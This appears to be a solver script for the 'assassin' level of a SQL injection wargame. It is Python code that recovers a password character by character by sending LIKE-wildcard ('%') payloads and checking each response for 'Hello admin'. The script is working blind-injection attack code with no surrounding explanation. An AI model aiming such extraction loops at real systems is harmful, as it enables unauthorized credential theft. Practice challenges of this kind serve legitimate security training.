import urllib.parse
import http.client

HTTP=http.client.HTTPConnection("los.eagle-jump.org")
Url="/assassin_bec1c90a48bc3a9f95fbf0c8ae8c88e1.php?pw="
Headers={"Cookie":"__cfduid=[your Own cfduid]; PHPSESSID=[your Own PHPSESSID]"} #check your own cookie then insert the correct value to make connection success, or you will get nothing return.
Passwd=""

pwNotInChar = False
for i in range(len(Passwd)+1,100):
    for c in "0123456789abcdefghijklmnopqrstuvwxyz+":

        Payload=Passwd+str(c)+"%"

        HTTP.request("GET",Url+urllib.parse.quote(Payload),"",Headers)

        print (Payload)

        #print (HTTP.getresponse().read())

        Response = HTTP.getresponse().read()

        if (b"Hello admin" in Response):
            Passwd+=str(c)
            print ("[*] Password: %s" % Passwd)
            break
        
        elif (b"Hello " in Response):
            print ("[+] Found: %c" % c)
            Passwd+=str(c)
            break
        if (str(c) == "+"):
            pwNotInChar = True
            break
    if(pwNotInChar == True):
        break
print ("[*] Password: %s" % Passwd)